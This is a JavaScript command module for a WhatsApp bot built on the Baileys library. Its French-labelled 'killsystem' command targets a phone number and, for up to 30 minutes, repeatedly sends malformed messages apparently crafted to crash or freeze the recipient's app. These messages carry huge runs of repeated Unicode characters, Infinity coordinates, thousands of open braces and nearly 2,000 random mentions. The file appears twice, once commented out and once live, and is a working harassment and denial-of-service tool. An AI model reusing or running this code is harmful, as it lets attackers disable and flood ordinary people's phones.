/*
import { isWhitelisted, WHITELIST_BLOCKED_MESSAGE } from "../js/config.js";
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "killsystem",
  description: "Lance un spam avec la fonction killsystem",
  background: true,
  async execute(context) {
    const { from, msg, args } = context;
    const trim = () => context.sock;
    const targetNumber = args?.[0] || "";
    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    if (isWhitelisted(number) || isWhitelisted(targetNumber)) {
      return { success: false, blocked: true, message: WHITELIST_BLOCKED_MESSAGE };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const config = {
        duration: context.durationMs || 30 * 60 * 1000,
        actionInterval: 2000,
        maxPerHour: 3100,
      };

      const startTime = context.startedAt || Date.now();
      const DEADLINE = context.deadline || startTime + config.duration;
      let sent = context.state?.sent || 0;
      let hourCount = context.state?.hourCount || 0;
      let hourStart = context.state?.hourStart || startTime;

      async function killsystem(trim, target) {
        if (!trim || !target) return;

        const uw = "ោ៝".repeat(10000);
        const uz = "ꦾ".repeat(10000);
        const up = {
          newsletterAdminInviteMessage: {
            newsletterJid: "1234567891234@newsletter",
            newsletterName: "ApolysisHunter" + "ោ៝".repeat(20000),
            caption: "🩸Tere hakimu Chachi Ko paku" + uw + uz + "ោ៝".repeat(10000),
            inviteExpiration: "90000",
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
            }
          }
        };

        await trim.relayMessage(target, up, {
          participant: { jid: target },
          messageId: null
        });
        await new Promise(resolve => setTimeout(resolve, 800));

        const uw2 = "ꦾ".repeat(61111);
        await trim.relayMessage(target, {
          locationMessage: {
            degreesLatitude: Infinity,
            degreesLongitude: -Infinity,
            name: "‼️⃟ ༚ ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ.   " + uw2,
            inviteLinkGroupTypeV2: "DEFAULT",
            merchantUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            url: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            thumbnailUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            waWebSocketUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            mediaUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            sourceUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            originalImageUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
            clickToWhatsappCall: true,
            contextInfo: {
              remoteJid: "@s.whatsapp.net",
              participant: "13135550002@s.whatsapp.net",
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
              externalAdReply: {
                quotedAd: {
                  advertiserName: uw2,
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFtargetSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                  caption: "‼️⃟ ༚ ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ.   " + uw2
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              },
              mentionedJid: [target, "0@s.whatsapp.net", "13135550002@s.whatsapp.net", ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
              stanzaId: trim.generateMessageTag(),
              virtexId: trim.generateMessageTag(),
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: -Infinity * Infinity
                }
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
              }
            }
          }
        }, {
          participant: { jid: target }
        });
        await new Promise(resolve => setTimeout(resolve, 1200));

        await trim.relayMessage(target, {
          viewOnceMessage: {
            message: {
              extendedMessage: {
                body: {
                  text: "Brody" + "ꦽ".repeat(25000) + "ꦽ".repeat(5000)
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "catalog_message",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "send_location",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "review_order",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }, {
                    name: "review_and_pay",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                  }]
                }
              }
            }
          }
        }, {
          messageId: null,
          participant: { jid: target }
        });
        await new Promise(resolve => setTimeout(resolve, 600));

        await trim.relayMessage(target, {
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "999999999@newsletter",
                newsletterName: "Tere hakimu Chachi Ko paku" + "ꦽ".repeat(25000),
                jpegThumbnail: "",
                caption: "Tere hakimu Chachi Ko paku" + "ꦽ".repeat(15000),
                inviteExpiration: Date.now() + 1814400000
              }
            }
          }
        }, {
          messageId: null,
          participant: { jid: target }
        });
        await new Promise(resolve => setTimeout(resolve, 600));
      }

      while (Date.now() < DEADLINE) {
        if (context.isCancelled?.()) break;

        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        const live = await context.waitForSocket?.();
        if (!live) break;

        if (hourCount < config.maxPerHour) {
          try {
            await killsystem(live, target);
            hourCount++;
            sent++;
          } catch (actionError) {
            console.error("⚠️ killsystem action ratee (" + number + ") :", actionError?.message || actionError);
            //context.onStatus?.("Action ratée — nouvelle tentative dans 2s");
            //context.onStatus?.(`Action ratée — ${actionError?.message || actionError} — nouvelle tentative dans 2s`);
            const errorDetails = actionError instanceof Error
  ? {
      name: actionError.name,
      message: actionError.message,
      stack: actionError.stack,
      cause: actionError.cause
    }
  : actionError;

context.onStatus?.(`⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
          }
        }

        context.onProgress?.({ sent, hourCount, hourStart });
        await (context.sleep ? context.sleep(config.actionInterval) : new Promise(r => setTimeout(r, config.actionInterval)));
      }

      const cancelled = !!context.isCancelled?.();
      return {
        success: true,
        cancelled,
        message: cancelled
          ? `Spam killsystem arrêté sur ${number} (${sent} action(s) envoyée(s))`
          : `Spam killsystem terminé sur ${number} (${sent} action(s) envoyée(s))`
      };
    } catch (error) {
      console.error("❌ Erreur killsystem :", error);
      return { success: false, message: "Spam killsystem interrompu" };
    }
  }
}; 
*/

import { isWhitelisted, WHITELIST_BLOCKED_MESSAGE } from "../js/config.js";
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "killsystem",
  description: "Lance un spam avec la fonction killsystem",
  background: true,
  async execute(context) {
    const { from, msg, args } = context;
    const trim = () => context.sock;
    const targetNumber = args?.[0] || "";
    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    if (isWhitelisted(number) || isWhitelisted(targetNumber)) {
      return { success: false, blocked: true, message: WHITELIST_BLOCKED_MESSAGE };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const config = {
        duration: context.durationMs || 30 * 60 * 1000,
        actionInterval: 2000,
        maxPerHour: 3100,
      };

      const startTime = context.startedAt || Date.now();
      const DEADLINE = context.deadline || startTime + config.duration;
      let sent = context.state?.sent || 0;
      let hourCount = context.state?.hourCount || 0;
      let hourStart = context.state?.hourStart || startTime;

      async function killsystem(trim, target) {
        if (!trim || !target) return;

        const uw = "ោ៝".repeat(10000);
        const uz = "ꦾ".repeat(10000);
        const up = {
          newsletterAdminInviteMessage: {
            newsletterJid: "1234567891234@newsletter",
            newsletterName: "ApolysisHunter" + "ោ៝".repeat(20000),
            caption: "🩸Tere hakimu Chachi Ko paku" + uw + uz + "ោ៝".repeat(10000),
            inviteExpiration: "90000",
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
            }
          }
        };

        try {
          await trim.relayMessage(target, up, {
            participant: { jid: target, count: 1 },
            messageId: null
          });
        } catch (actionError) {
          const errorDetails = actionError instanceof Error
            ? {
                name: actionError.name,
                message: actionError.message,
                stack: actionError.stack,
                cause: actionError.cause
              }
            : actionError;
          context.onStatus?.(`Ligne1 ⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
        }
        await new Promise(resolve => setTimeout(resolve, 800));

       const uw2 = "ꦾ".repeat(61111);
        try {
          await trim.relayMessage(target, {
            locationMessage: {
              degreesLatitude: Infinity,
              degreesLongitude: -Infinity,
              name: "‼️⃟ ༚ ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ.   " + uw2,
              inviteLinkGroupTypeV2: "DEFAULT",
              merchantUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              url: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              thumbnailUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              waWebSocketUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              mediaUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              sourceUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              originalImageUrl: "https://whatsapp." + uw2 + ".crash.raldz.com/" + uw2 + "/" + uw2 + "/" + uw2 + "/",
              clickToWhatsappCall: true,
              contextInfo: {
                remoteJid: "@s.whatsapp.net",
                participant: "13135550002@s.whatsapp.net",
                disappearingMode: {
                  initiator: "CHANGED_IN_CHAT",
                  trigger: "CHAT_SETTING"
                },
                externalAdReply: {
                  quotedAd: {
                    advertiserName: uw2,
                    mediaType: "IMAGE",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFtargetSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    caption: "‼️⃟ ༚ ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ.   " + uw2
                  },
                  placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                },
                mentionedJid: [target, "0@s.whatsapp.net", "13135550002@s.whatsapp.net", ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                stanzaId: trim.generateMessageTag(),
                virtexId: trim.generateMessageTag(),
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: -Infinity * Infinity
                  }
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            }
          }, {
            participant: { jid: target, count: 1 }
          });
        } catch (actionError) {
          const errorDetails = actionError instanceof Error
            ? {
                name: actionError.name,
                message: actionError.message,
                stack: actionError.stack,
                cause: actionError.cause
              }
            : actionError;
          context.onStatus?.(`Ligne 2⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
        }
        await new Promise(resolve => setTimeout(resolve, 1200));

        try {
          await trim.relayMessage(target, {
            viewOnceMessage: {
              message: {
                extendedMessage: {
                  body: {
                    text: "Brody" + "ꦽ".repeat(25000) + "ꦽ".repeat(5000)
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "catalog_message",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "send_location",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "mpm",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "review_order",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "call_permission_request",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "cta_call",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }, {
                      name: "review_and_pay",
                      buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000) })
                    }]
                  }
                }
              }
            }
          }, {
            messageId: null,
            participant: { jid: target, count: 1 }
          });
        } catch (actionError) {
          const errorDetails = actionError instanceof Error
            ? {
                name: actionError.name,
                message: actionError.message,
                stack: actionError.stack,
                cause: actionError.cause
              }
            : actionError;
          context.onStatus?.(`Ligne 3⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
        }
        await new Promise(resolve => setTimeout(resolve, 600));

        try {
          await trim.relayMessage(target, {
            viewOnceMessage: {
              message: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "999999999@newsletter",
                  newsletterName: "Tere hakimu Chachi Ko paku" + "ꦽ".repeat(25000),
                  jpegThumbnail: "",
                  caption: "Tere hakimu Chachi Ko paku" + "ꦽ".repeat(15000),
                  inviteExpiration: Date.now() + 1814400000
                }
              }
            }
          }, {
            messageId: null,
            participant: { jid: target, count: 1 }
          });
        } catch (actionError) {
          const errorDetails = actionError instanceof Error
            ? {
                name: actionError.name,
                message: actionError.message,
                stack: actionError.stack,
                cause: actionError.cause
              }
            : actionError;
          context.onStatus?.(`Ligne 4⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
        }
        await new Promise(resolve => setTimeout(resolve, 600));
      }

      while (Date.now() < DEADLINE) {
        if (context.isCancelled?.()) break;

        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        const live = await context.waitForSocket?.();
        if (!live) break;

        if (hourCount < config.maxPerHour) {
          try {
            await killsystem(live, target);
            hourCount++;
            sent++;
          } catch (actionError) {
            console.error("⚠️ killsystem action ratee (" + number + ") :", actionError?.message || actionError);
            const errorDetails = actionError instanceof Error
              ? {
                  name: actionError.name,
                  message: actionError.message,
                  stack: actionError.stack,
                  cause: actionError.cause
                }
              : actionError;
            context.onStatus?.(`Ligne Fin⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
          }
        }

        context.onProgress?.({ sent, hourCount, hourStart });
        await (context.sleep ? context.sleep(config.actionInterval) : new Promise(r => setTimeout(r, config.actionInterval)));
      }

      const cancelled = !!context.isCancelled?.();
      return {
        success: true,
        cancelled,
        message: cancelled
          ? `Spam killsystem arrêté sur ${number} (${sent} action(s) envoyée(s))`
          : `Spam killsystem terminé sur ${number} (${sent} action(s) envoyée(s))`
      };
    } catch (error) {
      console.error("❌ Erreur killsystem :", error);
      return { success: false, message: "Spam killsystem interrompu" };
    }
  }
};